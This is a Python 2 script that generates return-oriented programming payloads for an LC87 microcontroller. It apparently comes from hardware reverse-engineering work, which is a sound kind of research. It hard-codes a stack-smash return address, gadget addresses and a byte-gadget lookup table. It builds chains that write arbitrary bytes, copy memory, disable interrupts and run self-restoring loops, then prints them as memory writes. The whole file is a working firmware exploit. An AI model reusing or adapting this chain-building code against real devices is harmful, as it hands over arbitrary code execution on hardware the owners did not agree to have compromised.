#!/usr/bin/env python

# This should be reading from a var we can try writing
word_addr = 0x3ae

# An okay place to return from the stack smash
mainloop_safe_spot = 0x818

# RAM addresses
stack_base = 0x443
timer0_funcptr = 0x39d
rop_addr = 0x4f0

# LC87 registers
interrupt_enable = 0xfe08
debug_port = 0xfe4c

# Code gadgets
ret = 0x244
infinite_loop = 0x1ac
ldw_spl_popw_r0 = 0x26f1
popw_spl_r0 = 0x7d6
popw_r3 = 0xe1b
popw_r2_r3_r4 = 0x013cb
copy_codememR3_ramR2_countR4 = 0x2a30
stw_r3_ep0ack_ld04_popw_r2_r4_r5_r7_r6 = 0x23ec
st_r1_ep0ackstall_popw_r2 = 0x1e42
timer0_disable = 0x29ca
memcpy_destR2_srcR3_countR4 = 0x29e0

# Lookup table for finding arbitrary bytes in code memory
# missing values: 52 D2
byte_gadgets = [
	0x0044, 0x0002, 0x00a1, 0x009f, 0x009e, 0x009d, 0x0128, 0x009c,
	0x009b, 0x009a, 0x0176, 0x0025, 0x0098, 0x00b2, 0x0097, 0x0096,
	0x00be, 0x0095, 0x00ca, 0x0094, 0x00d2, 0x0093, 0x00dc, 0x0092,
	0x00e4, 0x0091, 0x00ec, 0x0090, 0x00f4, 0x00f8, 0x008f, 0x0102,
	0x0000, 0x010a, 0x010e, 0x008d, 0x01dd, 0x008c, 0x02da, 0x0258,
	0x008b, 0x0259, 0x0015, 0x002d, 0x0045, 0x0089, 0x04fb, 0x025c,
	0x0088, 0x02df, 0x025d, 0x004c, 0x025e, 0x0086, 0x025f, 0x02e2,
	0x0085, 0x0261, 0x02e4, 0x0084, 0x02e5, 0x0263, 0x0083, 0x0220,
	0x03f1, 0x0082, 0x0173, 0x0160, 0x0081, 0x0267, 0x07b8, 0x0080,
	0x07eb, 0x02eb, 0x007f, 0x02ec, 0x026a, 0x007e, 0x0139, 0x01d8,
	0x026c, 0x007d, None,   0x026e, 0x007c, 0x026f, 0x0839, 0x007b,
	0x0589, 0x0271, 0x007a, 0x0272, 0x02f5, 0x0079, 0x1544, 0x0274,
	0x0078, 0x02f7, 0x0275, 0x0077, 0x0276, 0x02f9, 0x0277, 0x0076,
	0x01b6, 0x0279, 0x0075, 0x027a, 0x063e, 0x0074, 0x1be0, 0x027c,
	0x0073, 0x02ff, 0x0001, 0x0072, 0x0301, 0x027f, 0x0071, 0x0280,
	0x05ca, 0x0070, 0x1ad8, 0x0304, 0x006f, 0x0305, 0x0283, 0x006e,
	0x01df, 0x006d, 0x01be, 0x01b9, 0x006c, 0x01b7, 0x0014, 0x006b,
	0x01b8, 0x0187, 0x006a, 0x028a, 0x0069, 0x028b, 0x030e, 0x0068,
	0x030f, 0x0067, 0x01e5, 0x028e, 0x0066, 0x028f, 0x0065, 0x0175,
	0x0185, 0x0064, 0x0291, 0x0063, 0x0315, 0x0062, 0x0316, 0x0061,
	0x0186, 0x0060, 0x0295, 0x005f, 0x0296, 0x005e, 0x005d, 0x0298,
	0x005c, 0x005b, 0x0148, 0x005a, 0x0059, 0x0058, 0x014e, 0x0057,
	0x0056, 0x0054, 0x0053, 0x0051, 0x004e, 0x0034, 0x02a0, 0x0b2d,
	0x0242, 0x02a1, 0x02a2, 0x02a3, 0x0610, 0x02a4, 0x0327, 0x02a5,
	0x037d, 0x02a6, 0x1875, 0x02a7, 0x032a, 0x02a8, 0x032b, 0x02a9,
	0x07f0, 0x02aa, 0x02ab, 0x032e, 0x02ac, 0x0b64, 0x02ad, 0x0331,
	0x02ae, 0x02af, None,   0x02b0, 0x001c, 0x02b1, 0x02b2, 0x0335,
	0x02b3, 0x003c, 0x013c, 0x0337, 0x0338, 0x02b5, 0x02b6, 0x01aa,
	0x02b7, 0x02b8, 0x19f7, 0x033c, 0x02b9, 0x02ba, 0x0747, 0x0745,
	0x02bc, 0x02bd, 0x02be, 0x0740, 0x02bf, 0x0757, 0x0024, 0x0343,
	0x02c1, 0x02c2, 0x02c3, 0x0346, 0x02c4, 0x0347, 0x02c5, 0x0191,
	0x05f2, 0x0737, 0x0736, 0x075f, 0x06bb, 0x0784, 0x0177, 0x0003
]


def write_block(addr, bytes):
	print '%04x %s' % (addr, ' '.join(['%02x' % b for b in bytes]))

def write(addr, bytes):
	while bytes:
		write_block(addr, bytes[:0x10])
		addr += 0x10
		bytes = bytes[0x10:]


class Ropper:
	def __init__(self):
		self.bytes = []

	def le16(self, word):
		self.bytes = [word & 0xFF, word >> 8] + self.bytes

	def nop(self, count = 1):
		while count > 0:
			self.le16(ret)
			count -= 1

	def jmp(self, sp):
		self.le16(popw_spl_r0)
		self.le16(sp + 2)

	def set_r2_r3_r4(self, r2, r3, r4):
		self.le16(popw_r2_r3_r4)
		self.le16(r2)
		self.le16(r3)
		self.le16(r4)

	def memcpy(self, dest, src, count):
		self.set_r2_r3_r4(dest, src, count)
		self.le16(memcpy_destR2_srcR3_countR4)

	def copy_from_codemem(self, dest, src, count):
		self.set_r2_r3_r4(dest, src, count)
		self.le16(copy_codememR3_ramR2_countR4)

	def poke(self, dest, byte):
		self.copy_from_codemem(dest, byte_gadgets[byte], 1)

	def get_stuck(self):
		self.le16(infinite_loop)

	def debug_pulse(self, count=1):
		for i in range(count):
			self.poke(debug_port, 0)
			self.poke(debug_port, 1)


def make_slide(entry):
	r = Ropper()
	r.nop(6)
	r.jmp(entry)
	assert len(r.bytes) == 0x10
	return r.bytes


def make_looper(base_addr, setup_code, body_code):
	# Executing code destroys it, we have to make copies.

	def trampoline(dest, src, size):
		r = Ropper()
		r.memcpy(dest, src, size)
		r.jmp(dest + size - 1)
		return r.bytes

	trampoline_size = len(trampoline(0,0,0))

	# We'll need to include room for 2 extra trampolines with the body,
	# the one used to restore the setup trampoline, and the setup trampoline itself.
	augmented_body_size = 2 * trampoline_size + len(body_code)

	# Now we can lay out the address space
	addr_setup_trampoline = base_addr
	addr_setup_code = addr_setup_trampoline + trampoline_size
	addr_augbody_orig = addr_setup_code + len(setup_code)
	addr_augbody_copy = addr_augbody_orig + augmented_body_size

	setup_trampoline = trampoline(addr_augbody_copy, addr_augbody_orig, augmented_body_size)
	restore_trampoline = trampoline(addr_setup_trampoline, addr_augbody_orig, trampoline_size)

	augmented_body = setup_trampoline + restore_trampoline + body_code
	assert len(augmented_body) == augmented_body_size
	return (setup_trampoline + setup_code + augmented_body, addr_augbody_orig - 1)


def setup_func():
	r = Ropper()
	r.poke(interrupt_enable, 0)
	return r.bytes

def loop_func():
	r = Ropper()
	r.debug_pulse()
	return r.bytes


def write_loop(base_addr, setup_code, body_code):
	# Make a code fragment that runs repeatedly
	looper, entry = make_looper(base_addr, setup_code, body_code)
	write(base_addr, looper)
	write(stack_base, make_slide(entry))

def write_loopback(base_addr, byte):
	# Working code fragment that returns a byte
	r = Ropper()
	r.poke(word_addr, byte)
	r.le16(mainloop_safe_spot)
	write(base_addr, r.bytes)
	write(stack_base, make_slide(base_addr + len(r.bytes) - 1))

def write_reader(base_addr, src_addr):
	# Reads back 2 bytes from RAM
	r = Ropper()
	r.memcpy(word_addr, src_addr, 2)
	r.le16(mainloop_safe_spot)
	write(base_addr, r.bytes)
	write(stack_base, make_slide(base_addr + len(r.bytes) - 1))


if __name__ == '__main__':
	write_loop(rop_addr, setup_func(), loop_func())

